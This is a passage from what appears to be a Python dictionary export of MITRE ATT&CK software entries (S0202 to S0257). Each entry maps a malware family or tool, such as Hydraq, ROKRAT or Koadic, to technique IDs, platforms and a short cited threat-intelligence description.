                          '[Dipsind](https://attack.mitre.org/software/S0200). (Citation: Microsoft PLATINUM April '
                          '2016)',
           'name': 'adbupd',
           'platforms': ['Windows'],
           'software_id': 'S0202',
           'type': 'malware'},
 'S0203': {'attack_ids': ['T1024',
                          'T1007',
                          'T1082',
                          'T1129',
                          'T1005',
                          'T1070',
                          'T1048',
                          'T1012',
                          'T1050',
                          'T1134',
                          'T1016',
                          'T1107',
                          'T1057',
                          'T1083',
                          'T1035',
                          'T1105',
                          'T1027',
                          'T1112',
                          'T1113'],
           'description': '[Hydraq](https://attack.mitre.org/software/S0203) is a data-theft trojan first used by '
                          '[Elderwood](https://attack.mitre.org/groups/G0066) in the 2009 Google intrusion known as '
                          'Operation Aurora, though variations of this trojan have been used in more recent campaigns '
                          'by other Chinese actors, possibly including [APT17](https://attack.mitre.org/groups/G0025). '
                          '(Citation: MicroFocus 9002 Aug 2016) (Citation: Symantec Elderwood Sept 2012) (Citation: '
                          'Symantec Trojan.Hydraq Jan 2010) (Citation: ASERT Seven Pointed Dagger Aug 2015) (Citation: '
                          'FireEye DeputyDog 9002 November 2013) (Citation: ProofPoint GoT 9002 Aug 2017) (Citation: '
                          'FireEye Sunshop Campaign May 2013) (Citation: PaloAlto 3102 Sept 2015)',
           'name': 'Hydraq',
           'platforms': ['Windows'],
           'software_id': 'S0203',
           'type': 'malware'},
 'S0204': {'attack_ids': ['T1085', 'T1060', 'T1043', 'T1050', 'T1105'],
           'description': '[Briba](https://attack.mitre.org/software/S0204) is a trojan used by '
                          '[Elderwood](https://attack.mitre.org/groups/G0066) to open a backdoor and download files on '
                          'to compromised hosts. (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Briba '
                          'May 2012)',
           'name': 'Briba',
           'platforms': ['Windows'],
           'software_id': 'S0204',
           'type': 'malware'},
 'S0205': {'attack_ids': ['T1094', 'T1016', 'T1112', 'T1082', 'T1043', 'T1050'],
           'description': '[Naid](https://attack.mitre.org/software/S0205) is a trojan used by '
                          '[Elderwood](https://attack.mitre.org/groups/G0066) to open a backdoor on compromised hosts. '
                          '(Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Naid June 2012)',
           'name': 'Naid',
           'platforms': ['Windows'],
           'software_id': 'S0205',
           'type': 'malware'},
 'S0206': {'attack_ids': ['T1055', 'T1043', 'T1050', 'T1105', 'T1059'],
           'description': '[Wiarp](https://attack.mitre.org/software/S0206) is a trojan used by '
                          '[Elderwood](https://attack.mitre.org/groups/G0066) to open a backdoor on compromised hosts. '
                          '(Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Wiarp May 2012)',
           'name': 'Wiarp',
           'platforms': ['Windows'],
           'software_id': 'S0206',
           'type': 'malware'},
 'S0207': {'attack_ids': ['T1071', 'T1090', 'T1105', 'T1060'],
           'description': '[Vasport](https://attack.mitre.org/software/S0207) is a trojan used by '
                          '[Elderwood](https://attack.mitre.org/groups/G0066) to open a backdoor on compromised hosts. '
                          '(Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Vasport May 2012)',
           'name': 'Vasport',
           'platforms': ['Windows'],
           'software_id': 'S0207',
           'type': 'malware'},
 'S0208': {'attack_ids': ['T1107', 'T1082', 'T1177', 'T1005', 'T1043', 'T1057', 'T1083', 'T1105'],
           'description': '[Pasam](https://attack.mitre.org/software/S0208) is a trojan used by '
                          '[Elderwood](https://attack.mitre.org/groups/G0066) to open a backdoor on compromised hosts. '
                          '(Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Pasam May 2012)',
           'name': 'Pasam',
           'platforms': ['Windows'],
           'software_id': 'S0208',
           'type': 'malware'},
 'S0210': {'attack_ids': ['T1050', 'T1105', 'T1112', 'T1116'],
           'description': '[Nerex](https://attack.mitre.org/software/S0210) is a Trojan used by '
                          '[Elderwood](https://attack.mitre.org/groups/G0066) to open a backdoor on compromised hosts. '
                          '(Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Nerex May 2012)',
           'name': 'Nerex',
           'platforms': ['Windows'],
           'software_id': 'S0210',
           'type': 'malware'},
 'S0211': {'attack_ids': ['T1107', 'T1082', 'T1008', 'T1005', 'T1057', 'T1029', 'T1083', 'T1105', 'T1059'],
           'description': '[Linfo](https://attack.mitre.org/software/S0211) is a rootkit trojan used by '
                          '[Elderwood](https://attack.mitre.org/groups/G0066) to open a backdoor on compromised hosts. '
                          '(Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Linfo May 2012)',
           'name': 'Linfo',
           'platforms': ['Windows'],
           'software_id': 'S0211',
           'type': 'malware'},
 'S0212': {'attack_ids': ['T1083', 'T1071', 'T1002', 'T1022'],
           'description': '[CORALDECK](https://attack.mitre.org/software/S0212) is an exfiltration tool used by '
                          '[APT37](https://attack.mitre.org/groups/G0067). (Citation: FireEye APT37 Feb 2018)',
           'name': 'CORALDECK',
           'platforms': ['Windows'],
           'software_id': 'S0212',
           'type': 'malware'},
 'S0213': {'attack_ids': ['T1027', 'T1056', 'T1113', 'T1102', 'T1123', 'T1105'],
           'description': '[DOGCALL](https://attack.mitre.org/software/S0213) is a backdoor used by '
                          '[APT37](https://attack.mitre.org/groups/G0067) that has been used to target South Korean '
                          'government and military organizations in 2017. It is typically dropped using a Hangul Word '
                          'Processor (HWP) exploit. (Citation: FireEye APT37 Feb 2018)',
           'name': 'DOGCALL',
           'platforms': ['Windows'],
           'software_id': 'S0213',
           'type': 'malware'},
 'S0214': {'attack_ids': ['T1082', 'T1033', 'T1105'],
           'description': '[HAPPYWORK](https://attack.mitre.org/software/S0214) is a downloader used by '
                          '[APT37](https://attack.mitre.org/groups/G0067) to target South Korean government and '
                          'financial victims in November 2016. (Citation: FireEye APT37 Feb 2018)',
           'name': 'HAPPYWORK',
           'platforms': ['Windows'],
           'software_id': 'S0214',
           'type': 'malware'},
 'S0215': {'attack_ids': ['T1082', 'T1102', 'T1105', 'T1189'],
           'description': '[KARAE](https://attack.mitre.org/software/S0215) is a backdoor typically used by '
                          '[APT37](https://attack.mitre.org/groups/G0067) as first-stage malware. (Citation: FireEye '
                          'APT37 Feb 2018)',
           'name': 'KARAE',
           'platforms': ['Windows'],
           'software_id': 'S0215',
           'type': 'malware'},
 'S0216': {'attack_ids': ['T1082', 'T1113', 'T1057', 'T1189', 'T1102', 'T1083'],
           'description': '[POORAIM](https://attack.mitre.org/software/S0216) is a backdoor used by '
                          '[APT37](https://attack.mitre.org/groups/G0067) in campaigns since at least 2014. (Citation: '
                          'FireEye APT37 Feb 2018)',
           'name': 'POORAIM',
           'platforms': ['Windows'],
           'software_id': 'S0216',
           'type': 'malware'},
 'S0217': {'attack_ids': ['T1082', 'T1105', 'T1113'],
           'description': '[SHUTTERSPEED](https://attack.mitre.org/software/S0217) is a backdoor used by '
                          '[APT37](https://attack.mitre.org/groups/G0067). (Citation: FireEye APT37 Feb 2018)',
           'name': 'SHUTTERSPEED',
           'platforms': ['Windows'],
           'software_id': 'S0217',
           'type': 'malware'},
 'S0218': {'attack_ids': ['T1082', 'T1102', 'T1105'],
           'description': '[SLOWDRIFT](https://attack.mitre.org/software/S0218) is a backdoor used by '
                          '[APT37](https://attack.mitre.org/groups/G0067) against academic and strategic victims in '
                          'South Korea. (Citation: FireEye APT37 Feb 2018)',
           'name': 'SLOWDRIFT',
           'platforms': ['Windows'],
           'software_id': 'S0218',
           'type': 'malware'},
 'S0219': {'attack_ids': ['T1010', 'T1082', 'T1007', 'T1057', 'T1083', 'T1033', 'T1059'],
           'description': '[WINERACK](https://attack.mitre.org/software/S0219) is a backdoor used by '
                          '[APT37](https://attack.mitre.org/groups/G0067). (Citation: FireEye APT37 Feb 2018)',
           'name': 'WINERACK',
           'platforms': ['Windows'],
           'software_id': 'S0219',
           'type': 'malware'},
 'S0220': {'attack_ids': ['T1110', 'T1094', 'T1032', 'T1205', 'T1104', 'T1059'],
           'description': '[Chaos](https://attack.mitre.org/software/S0220) is Linux malware that compromises systems '
                          'by brute force attacks against SSH services. Once installed, it provides a reverse shell to '
                          'its controllers, triggered by unsolicited packets. (Citation: Chaos Stolen Backdoor)',
           'name': 'Chaos',
           'platforms': ['Linux'],
           'software_id': 'S0220',
           'type': 'malware'},
 'S0221': {'attack_ids': ['T1071', 'T1078', 'T1014', 'T1205', 'T1059'],
           'description': 'A Linux rootkit that provides backdoor access and hides from defenders.',
           'name': 'Umbreon',
           'platforms': ['Linux'],
           'software_id': 'S0221',
           'type': 'malware'},
 'S0222': {'attack_ids': ['T1195', 'T1483'],
           'description': '[CCBkdr](https://attack.mitre.org/software/S0222) is malware that was injected into a '
                          "signed version of CCleaner and distributed from CCleaner's distribution website. (Citation: "
                          'Talos CCleanup 2017) (Citation: Intezer Aurora Sept 2017)',
           'name': 'CCBkdr',
           'platforms': ['Windows'],
           'software_id': 'S0222',
           'type': 'malware'},
 'S0223': {'attack_ids': ['T1087',
                          'T1175',
                          'T1032',
                          'T1053',
                          'T1029',
                          'T1047',
                          'T1140',
                          'T1082',
                          'T1132',
                          'T1090',
                          'T1005',
                          'T1036',
                          'T1086',
                          'T1170',
                          'T1065',
                          'T1107',
                          'T1016',
                          'T1064',
                          'T1105',
                          'T1027',
                          'T1113',
                          'T1043',
                          'T1089',
                          'T1173',
                          'T1063'],
           'description': '[POWERSTATS](https://attack.mitre.org/software/S0223) is a PowerShell-based first stage '
                          'backdoor used by [MuddyWater](https://attack.mitre.org/groups/G0069). (Citation: Unit 42 '
                          'MuddyWater Nov 2017)',
           'name': 'POWERSTATS',
           'platforms': ['Windows'],
           'software_id': 'S0223',
           'type': 'malware'},
 'S0224': {'attack_ids': ['T1190'],
           'description': '[Havij](https://attack.mitre.org/software/S0224) is an automatic SQL Injection tool '
                          'distributed by the Iranian ITSecTeam security company. Havij has been used by penetration '
                          'testers and adversaries. (Citation: Check Point Havij Analysis)',
           'name': 'Havij',
           'platforms': ['Linux', 'Windows', 'macOS'],
           'software_id': 'S0224',
           'type': 'tool'},
 'S0225': {'attack_ids': ['T1190'],
           'description': '[sqlmap](https://attack.mitre.org/software/S0225) is an open source penetration testing '
                          'tool that can be used to automate the process of detecting and exploiting SQL injection '
                          'flaws. (Citation: sqlmap Introduction)',
           'name': 'sqlmap',
           'platforms': ['Linux', 'Windows', 'macOS'],
           'software_id': 'S0225',
           'type': 'tool'},
 'S0226': {'attack_ids': ['T1195',
                          'T1071',
                          'T1140',
                          'T1027',
                          'T1055',
                          'T1053',
                          'T1503',
                          'T1060',
                          'T1081',
                          'T1114',
                          'T1064',
                          'T1093',
                          'T1083',
                          'T1497',
                          'T1105'],
           'description': '[Smoke Loader](https://attack.mitre.org/software/S0226) is a malicious bot application that '
                          'can be used to load other malware.\n'
                          '[Smoke Loader](https://attack.mitre.org/software/S0226) has been seen in the wild since at '
                          'least 2011 and has included a number of different payloads. It is notorious for its use of '
                          'deception and self-protection. It also comes with several plug-ins. (Citation: Malwarebytes '
                          'SmokeLoader 2016) (Citation: Microsoft Dofoil 2018)',
           'name': 'Smoke Loader',
           'platforms': ['Windows'],
           'software_id': 'S0226',
           'type': 'malware'},
 'S0227': {'attack_ids': ['T1213'],
           'description': '[spwebmember](https://attack.mitre.org/software/S0227) is a Microsoft SharePoint '
                          'enumeration and data dumping tool written in .NET. (Citation: NCC Group APT15 Alive and '
                          'Strong)',
           'name': 'spwebmember',
           'platforms': ['Windows'],
           'software_id': 'S0227',
           'type': 'tool'},
 'S0228': {'attack_ids': ['T1071',
                          'T1107',
                          'T1016',
                          'T1027',
                          'T1082',
                          'T1060',
                          'T1064',
                          'T1089',
                          'T1170',
                          'T1033',
                          'T1105'],
           'description': '[NanHaiShu](https://attack.mitre.org/software/S0228) is a remote access tool and JScript '
                          'backdoor used by [Leviathan](https://attack.mitre.org/groups/G0065). '
                          '[NanHaiShu](https://attack.mitre.org/software/S0228) has been used to target government and '
                          'private-sector organizations that have relations to the South China Sea dispute. (Citation: '
                          'Proofpoint Leviathan Oct 2017) (Citation: fsecure NanHaiShu July 2016)',
           'name': 'NanHaiShu',
           'platforms': ['Windows'],
           'software_id': 'S0228',
           'type': 'malware'},
 'S0229': {'attack_ids': ['T1518',
                          'T1016',
                          'T1027',
                          'T1082',
                          'T1057',
                          'T1093',
                          'T1064',
                          'T1102',
                          'T1070',
                          'T1117',
                          'T1083',
                          'T1105',
                          'T1059'],
           'description': '[Orz](https://attack.mitre.org/software/S0229) is a custom JavaScript backdoor used by '
                          '[Leviathan](https://attack.mitre.org/groups/G0065). It was observed being used in 2014 as '
                          'well as in August 2017 when it was dropped by Microsoft Publisher files. (Citation: '
                          'Proofpoint Leviathan Oct 2017) (Citation: FireEye Periscope March 2018)',
           'name': 'Orz',
           'platforms': ['Windows'],
           'software_id': 'S0229',
           'type': 'malware'},
 'S0230': {'attack_ids': ['T1140',
                          'T1071',
                          'T1009',
                          'T1016',
                          'T1027',
                          'T1032',
                          'T1082',
                          'T1073',
                          'T1045',
                          'T1001',
                          'T1088',
                          'T1050',
                          'T1105'],
           'description': '[ZeroT](https://attack.mitre.org/software/S0230) is a Trojan used by '
                          '[TA459](https://attack.mitre.org/groups/G0062), often in conjunction with '
                          '[PlugX](https://attack.mitre.org/software/S0013). (Citation: Proofpoint TA459 April 2017) '
                          '(Citation: Proofpoint ZeroT Feb 2017)',
           'name': 'ZeroT',
           'platforms': ['Windows'],
           'software_id': 'S0230',
           'type': 'malware'},
 'S0231': {'attack_ids': ['T1027'],
           'description': '[Invoke-PSImage](https://attack.mitre.org/software/S0231) takes a PowerShell script and '
                          'embeds the bytes of the script into the pixels of a PNG image. It generates a one liner for '
                          'executing either from a file of from the web. Example of usage is embedding the PowerShell '
                          'code from the Invoke-Mimikatz module and embed it into an image file. By calling the image '
                          'file from a macro for example, the macro will download the picture and execute the '
                          'PowerShell code, which in this case will dump the passwords. (Citation: GitHub '
                          'Invoke-PSImage)',
           'name': 'Invoke-PSImage',
           'platforms': ['Windows'],
           'software_id': 'S0231',
           'type': 'tool'},
 'S0232': {'attack_ids': ['T1003', 'T1027', 'T1059'],
           'description': '[HOMEFRY](https://attack.mitre.org/software/S0232) is a 64-bit Windows password '
                          'dumper/cracker that has previously been used in conjunction with other '
                          '[Leviathan](https://attack.mitre.org/groups/G0065) backdoors. (Citation: FireEye Periscope '
                          'March 2018)',
           'name': 'HOMEFRY',
           'platforms': ['Windows'],
           'software_id': 'S0232',
           'type': 'malware'},
 'S0233': {'attack_ids': ['T1018', 'T1107', 'T1087', 'T1082', 'T1053', 'T1069', 'T1046', 'T1135', 'T1059'],
           'description': '[MURKYTOP](https://attack.mitre.org/software/S0233) is a reconnaissance tool used by '
                          '[Leviathan](https://attack.mitre.org/groups/G0065). (Citation: FireEye Periscope March '
                          '2018)',
           'name': 'MURKYTOP',
           'platforms': ['Windows'],
           'software_id': 'S0233',
           'type': 'malware'},
 'S0234': {'attack_ids': ['T1125', 'T1056', 'T1113', 'T1093', 'T1123', 'T1059'],
           'description': '[Bandook](https://attack.mitre.org/software/S0234) is a commercially available RAT, written '
                          'in Delphi, which has been available since roughly 2007  (Citation: EFF Manul Aug 2016) '
                          '(Citation: Lookout Dark Caracal Jan 2018).',
           'name': 'Bandook',
           'platforms': ['Windows'],
           'software_id': 'S0234',
           'type': 'malware'},
 'S0235': {'attack_ids': ['T1083', 'T1159', 'T1113', 'T1060'],
           'description': '[CrossRAT](https://attack.mitre.org/software/S0235) is a cross platform RAT.',
           'name': 'CrossRAT',
           'platforms': ['Linux', 'Windows', 'macOS'],
           'software_id': 'S0235',
           'type': 'malware'},
 'S0236': {'attack_ids': ['T1087',
                          'T1007',
                          'T1140',
                          'T1201',
                          'T1085',
                          'T1082',
                          'T1036',
                          'T1050',
                          'T1009',
                          'T1077',
                          'T1016',
                          'T1018',
                          'T1069',
                          'T1057',
                          'T1135',
                          'T1083',
                          'T1105',
                          'T1027',
                          'T1008',
                          'T1049',
                          'T1033'],
           'description': '[Kwampirs](https://attack.mitre.org/software/S0236) is a backdoor Trojan used by '
                          '[Orangeworm](https://attack.mitre.org/groups/G0071). It has been found on machines which '
                          'had software installed for the use and control of high-tech imaging devices such as X-Ray '
                          'and MRI machines. (Citation: Symantec Orangeworm April 2018)',
           'name': 'Kwampirs',
           'platforms': ['Windows'],
           'software_id': 'S0236',
           'type': 'malware'},
 'S0237': {'attack_ids': ['T1053',
                          'T1007',
                          'T1059',
                          'T1047',
                          'T1082',
                          'T1005',
                          'T1065',
                          'T1124',
                          'T1016',
                          'T1049',
                          'T1057',
                          'T1083',
                          'T1497',
                          'T1066',
                          'T1071',
                          'T1027',
                          'T1025',
                          'T1173',
                          'T1033'],
           'description': '[GravityRAT](https://attack.mitre.org/software/S0237) is a remote access tool (RAT) and has '
                          'been in ongoing development since 2016. The actor behind the tool remains unknown, but two '
                          'usernames have been recovered that link to the author, which are "TheMartian" and "The '
                          'Invincible." According to the National Computer Emergency Response Team (CERT) of India, '
                          'the malware has been identified in attacks against organization and entities in India. '
                          '(Citation: Talos GravityRAT)',
           'name': 'GravityRAT',
           'platforms': ['Windows'],
           'software_id': 'S0237',
           'type': 'malware'},
 'S0238': {'attack_ids': ['T1071',
                          'T1124',
                          'T1119',
                          'T1107',
                          'T1016',
                          'T1485',
                          'T1082',
                          'T1005',
                          'T1057',
                          'T1043',
                          'T1064',
                          'T1041',
                          'T1083',
                          'T1012',
                          'T1035',
                          'T1059'],
           'description': '[Proxysvc](https://attack.mitre.org/software/S0238) is a malicious DLL used by [Lazarus '
                          'Group](https://attack.mitre.org/groups/G0032) in a campaign known as Operation GhostSecret. '
                          'It has appeared to be operating undetected since 2017 and was mostly observed in higher '
                          'education organizations. The goal of [Proxysvc](https://attack.mitre.org/software/S0238) is '
                          'to deliver additional payloads to the target and to maintain control for the attacker. It '
                          'is in the form of a DLL that can also be executed as a standalone process. (Citation: '
                          'McAfee GhostSecret)',
           'name': 'Proxysvc',
           'platforms': ['Windows'],
           'software_id': 'S0238',
           'type': 'malware'},
 'S0239': {'attack_ids': ['T1087',
                          'T1106',
                          'T1059',
                          'T1140',
                          'T1203',
                          'T1082',
                          'T1132',
                          'T1005',
                          'T1070',
                          'T1065',
                          'T1119',
                          'T1012',
                          'T1099',
                          'T1031',
                          'T1134',
                          'T1107',
                          'T1057',
                          'T1001',
                          'T1083',
                          'T1105',
                          'T1071',
                          'T1112',
                          'T1041'],
           'description': '[Bankshot](https://attack.mitre.org/software/S0239) is a remote access tool (RAT) that was '
                          'first reported by the Department of Homeland Security in December of 2017. In 2018, '
                          '[Lazarus Group](https://attack.mitre.org/groups/G0032) used the '
                          '[Bankshot](https://attack.mitre.org/software/S0239) implant in attacks against the Turkish '
                          'financial sector. (Citation: McAfee Bankshot)',
           'name': 'Bankshot',
           'platforms': ['Windows'],
           'software_id': 'S0239',
           'type': 'malware'},
 'S0240': {'attack_ids': ['T1071',
                          'T1003',
                          'T1056',
                          'T1082',
                          'T1113',
                          'T1057',
                          'T1102',
                          'T1041',
                          'T1123',
                          'T1083',
                          'T1063',
                          'T1012',
                          'T1497',
                          'T1105'],
           'description': '[ROKRAT](https://attack.mitre.org/software/S0240) is a cloud-based remote access tool (RAT) '
                          'used by [APT37](https://attack.mitre.org/groups/G0067). This software has been used to '
                          'target victims in South Korea. [APT37](https://attack.mitre.org/groups/G0067) used ROKRAT '
                          'during several campaigns in 2016 through 2018. (Citation: Talos ROKRAT) (Citation: Talos '
                          'Group123)',
           'name': 'ROKRAT',
           'platforms': ['Windows'],
           'software_id': 'S0240',
           'type': 'malware'},
 'S0241': {'attack_ids': ['T1047',
                          'T1071',
                          'T1018',
                          'T1055',
                          'T1016',
                          'T1087',
                          'T1082',
                          'T1007',
                          'T1057',
                          'T1043',
                          'T1086',
                          'T1012',
                          'T1049',
                          'T1033',
                          'T1105',
                          'T1059'],
           'description': '[RATANKBA](https://attack.mitre.org/software/S0241) is a remote controller tool used by '
                          '[Lazarus Group](https://attack.mitre.org/groups/G0032). '
                          '[RATANKBA](https://attack.mitre.org/software/S0241) has been used in attacks targeting '
                          'financial institutions in Poland, Mexico, Uruguay, the United Kingdom, and Chile. It was '
                          'also seen used against organizations related to telecommunications, management consulting, '
                          'information technology, insurance, aviation, and education. '
                          '[RATANKBA](https://attack.mitre.org/software/S0241) has a graphical user interface to allow '
                          'the attacker to issue jobs to perform on the infected machines. (Citation: Lazarus '
                          'RATANKBA) (Citation: RATANKBA)',
           'name': 'RATANKBA',
           'platforms': ['Windows'],
           'software_id': 'S0241',
           'type': 'malware'},
 'S0242': {'attack_ids': ['T1027',
                          'T1112',
                          'T1186',
                          'T1082',
                          'T1007',
                          'T1057',
                          'T1106',
                          'T1070',
                          'T1486',
                          'T1083',
                          'T1012',
                          'T1033',
                          'T1497'],
           'description': '[SynAck](https://attack.mitre.org/software/S0242) is variant of Trojan ransomware targeting '
                          'mainly English-speaking users since at least fall 2017. (Citation: SecureList SynAck '
                          'Doppelgänging May 2018) (Citation: Kaspersky Lab SynAck May 2018)',
           'name': 'SynAck',
           'platforms': ['Windows'],
           'software_id': 'S0242',
           'type': 'malware'},
 'S0243': {'attack_ids': ['T1064', 'T1203', 'T1071'],
           'description': '[DealersChoice](https://attack.mitre.org/software/S0243) is a Flash exploitation framework '
                          'used by [APT28](https://attack.mitre.org/groups/G0007). (Citation: Sofacy DealersChoice)',
           'name': 'DealersChoice',
           'platforms': ['Windows'],
           'software_id': 'S0243',
           'type': 'malware'},
 'S0244': {'attack_ids': ['T1087',
                          'T1032',
                          'T1007',
                          'T1085',
                          'T1082',
                          'T1102',
                          'T1119',
                          'T1009',
                          'T1018',
                          'T1016',
                          'T1057',
                          'T1064',
                          'T1071',
                          'T1027',
                          'T1060',
                          'T1043',
                          'T1063',
                          'T1049',
                          'T1023'],
           'description': '[Comnie](https://attack.mitre.org/software/S0244) is a remote backdoor which has been used '
                          'in attacks in East Asia. (Citation: Palo Alto Comnie)',
           'name': 'Comnie',
           'platforms': ['Windows'],
           'software_id': 'S0244',
           'type': 'malware'},
 'S0245': {'attack_ids': ['T1024', 'T1016', 'T1112', 'T1090', 'T1082', 'T1043', 'T1089'],
           'description': '[BADCALL](https://attack.mitre.org/software/S0245) is a Trojan malware variant used by the '
                          'group [Lazarus Group](https://attack.mitre.org/groups/G0032). (Citation: US-CERT BADCALL)',
           'name': 'BADCALL',
           'platforms': ['Windows'],
           'software_id': 'S0245',
           'type': 'malware'},
 'S0246': {'attack_ids': ['T1024', 'T1090', 'T1043', 'T1089', 'T1059'],
           'description': '[HARDRAIN](https://attack.mitre.org/software/S0246) is a Trojan malware variant reportedly '
                          'used by the North Korean government. (Citation: US-CERT HARDRAIN March 2018)',
           'name': 'HARDRAIN',
           'platforms': ['Windows'],
           'software_id': 'S0246',
           'type': 'malware'},
 'S0247': {'attack_ids': ['T1071', 'T1055', 'T1074', 'T1056', 'T1082', 'T1060', 'T1057', 'T1064', 'T1105', 'T1059'],
           'description': '[NavRAT](https://attack.mitre.org/software/S0247) is a remote access tool designed to '
                          'upload, download, and execute files. It has been observed in attacks targeting South Korea. '
                          '(Citation: Talos NavRAT May 2018)',
           'name': 'NavRAT',
           'platforms': ['Windows'],
           'software_id': 'S0247',
           'type': 'malware'},
 'S0248': {'attack_ids': ['T1009',
                          'T1018',
                          'T1016',
                          'T1056',
                          'T1082',
                          'T1053',
                          'T1113',
                          'T1057',
                          'T1045',
                          'T1036',
                          'T1005',
                          'T1102',
                          'T1083',
                          'T1033',
                          'T1497'],
           'description': '[yty](https://attack.mitre.org/software/S0248) is a modular, plugin-based malware '
                          'framework. The components of the framework are written in a variety of programming '
                          'languages. (Citation: ASERT Donot March 2018)',
           'name': 'yty',
           'platforms': ['Windows'],
           'software_id': 'S0248',
           'type': 'malware'},
 'S0249': {'attack_ids': ['T1071',
                          'T1107',
                          'T1074',
                          'T1063',
                          'T1082',
                          'T1060',
                          'T1057',
                          'T1089',
                          'T1022',
                          'T1083',
                          'T1012',
                          'T1033',
                          'T1105',
                          'T1059'],
           'description': '[Gold Dragon](https://attack.mitre.org/software/S0249) is a Korean-language, data gathering '
                          'implant that was first observed in the wild in South Korea in July 2017. [Gold '
                          'Dragon](https://attack.mitre.org/software/S0249) was used along with [Brave '
                          'Prince](https://attack.mitre.org/software/S0252) and '
                          '[RunningRAT](https://attack.mitre.org/software/S0253) in operations targeting organizations '
                          'associated with the 2018 Pyeongchang Winter Olympics. (Citation: McAfee Gold Dragon)',
           'name': 'Gold Dragon',
           'platforms': ['Windows'],
           'software_id': 'S0249',
           'type': 'malware'},
 'S0250': {'attack_ids': ['T1055',
                          'T1032',
                          'T1117',
                          'T1059',
                          'T1047',
                          'T1085',
                          'T1005',
                          'T1170',
                          'T1003',
                          'T1016',
                          'T1064',
                          'T1046',
                          'T1088',
                          'T1135',
                          'T1035',
                          'T1105',
                          'T1076',
                          'T1033',
                          'T1115'],
           'description': '[Koadic](https://attack.mitre.org/software/S0250) is a Windows post-exploitation framework '
                          'and penetration testing tool. [Koadic](https://attack.mitre.org/software/S0250) is publicly '
                          'available on GitHub and the tool is executed via the command-line. '
                          '[Koadic](https://attack.mitre.org/software/S0250) has several options for staging payloads '
                          'and creating implants. [Koadic](https://attack.mitre.org/software/S0250) performs most of '
                          'its operations using Windows Script Host. (Citation: Github Koadic) (Citation: Palo Alto '
                          'Sofacy 06-2018)',
           'name': 'Koadic',
           'platforms': ['Windows'],
           'software_id': 'S0250',
           'type': 'tool'},
 'S0251': {'attack_ids': ['T1094',
                          'T1032',
                          'T1059',
                          'T1047',
                          'T1140',
                          'T1082',
                          'T1132',
                          'T1503',
                          'T1022',
                          'T1065',
                          'T1119',
                          'T1012',
                          'T1124',
                          'T1107',
                          'T1016',
                          'T1037',
                          'T1057',
                          'T1135',
                          'T1083',
                          'T1105',
                          'T1071',
                          'T1074',
                          'T1113',
                          'T1060',
                          'T1045',
                          'T1041',
                          'T1179',
                          'T1049',
                          'T1120',
                          'T1033'],
           'description': '[Zebrocy](https://attack.mitre.org/software/S0251) is a Trojan that has been used by '
                          '[APT28](https://attack.mitre.org/groups/G0007) since at least November 2015. The malware '
                          'comes in several programming language variants, including C++, Delphi, AutoIt, C#, and '
                          'VB.NET. (Citation: Palo Alto Sofacy 06-2018)(Citation: Unit42 Cannon Nov 2018)(Citation: '
                          'Unit42 Sofacy Dec 2018)',
           'name': 'Zebrocy',
           'platforms': ['Windows'],
           'software_id': 'S0251',
           'type': 'malware'},
 'S0252': {'attack_ids': ['T1071', 'T1016', 'T1082', 'T1057', 'T1089', 'T1083', 'T1012'],
           'description': '[Brave Prince](https://attack.mitre.org/software/S0252) is a Korean-language implant that '
                          'was first observed in the wild in December 2017. It contains similar code and behavior to '
                          '[Gold Dragon](https://attack.mitre.org/software/S0249), and was seen along with [Gold '
                          'Dragon](https://attack.mitre.org/software/S0249) and '
                          '[RunningRAT](https://attack.mitre.org/software/S0253) in operations surrounding the 2018 '
                          'Pyeongchang Winter Olympics. (Citation: McAfee Gold Dragon)',
           'name': 'Brave Prince',
           'platforms': ['Windows'],
           'software_id': 'S0252',
           'type': 'malware'},
 'S0253': {'attack_ids': ['T1107', 'T1056', 'T1082', 'T1060', 'T1064', 'T1089', 'T1070', 'T1002', 'T1115'],
           'description': '[RunningRAT](https://attack.mitre.org/software/S0253) is a remote access tool that appeared '
                          'in operations surrounding the 2018 Pyeongchang Winter Olympics along with [Gold '
                          'Dragon](https://attack.mitre.org/software/S0249) and [Brave '
                          'Prince](https://attack.mitre.org/software/S0252). (Citation: McAfee Gold Dragon)',
           'name': 'RunningRAT',
           'platforms': ['Windows'],
           'software_id': 'S0253',
           'type': 'malware'},
 'S0254': {'attack_ids': ['T1094', 'T1016', 'T1024', 'T1112', 'T1082', 'T1060', 'T1057', 'T1088', 'T1105', 'T1059'],
           'description': '[PLAINTEE](https://attack.mitre.org/software/S0254) is a malware sample that has been used '
                          'by [Rancor](https://attack.mitre.org/groups/G0075) in targeted attacks in Singapore and '
                          'Cambodia. (Citation: Rancor Unit42 June 2018)',
           'name': 'PLAINTEE',
           'platforms': ['Windows'],
           'software_id': 'S0254',
           'type': 'malware'},
 'S0255': {'attack_ids': ['T1140', 'T1094', 'T1085', 'T1083', 'T1105'],
           'description': '[DDKONG](https://attack.mitre.org/software/S0255) is a malware sample that was part of a '
                          'campaign by [Rancor](https://attack.mitre.org/groups/G0075). '
                          '[DDKONG](https://attack.mitre.org/software/S0255) was first seen used in February 2017. '
                          '(Citation: Rancor Unit42 June 2018)',
           'name': 'DDKONG',
           'platforms': ['Windows'],
           'software_id': 'S0255',
           'type': 'malware'},
 'S0256': {'attack_ids': ['T1047',
                          'T1016',
                          'T1107',
                          'T1024',
                          'T1027',
                          'T1112',
                          'T1085',
                          'T1060',
                          'T1057',
                          'T1106',
                          'T1122',
                          'T1086',
                          'T1063',
                          'T1033',
                          'T1105',
                          'T1059'],
           'description': '[Mosquito](https://attack.mitre.org/software/S0256) is a Win32 backdoor that has been used '
                          'by [Turla](https://attack.mitre.org/groups/G0010). '
                          '[Mosquito](https://attack.mitre.org/software/S0256) is made up of three parts: the '
                          'installer, the launcher, and the backdoor. The main backdoor is called CommanderDLL and is '
                          'launched by the loader program. (Citation: ESET Turla Mosquito Jan 2018)',
           'name': 'Mosquito',
           'platforms': ['Windows'],
           'software_id': 'S0256',
           'type': 'malware'},
 'S0257': {'attack_ids': ['T1140',
                          'T1071',
                          'T1107',
                          'T1016',
                          'T1027',
                          'T1056',
                          'T1063',
                          'T1082',
                          'T1113',
                          'T1057',
                          'T1045',
                          'T1022',
                          'T1123',
                          'T1119',
                          'T1033',
                          'T1105',
                          'T1115'],
           'description': '[VERMIN](https://attack.mitre.org/software/S0257) is a remote access tool written in the '
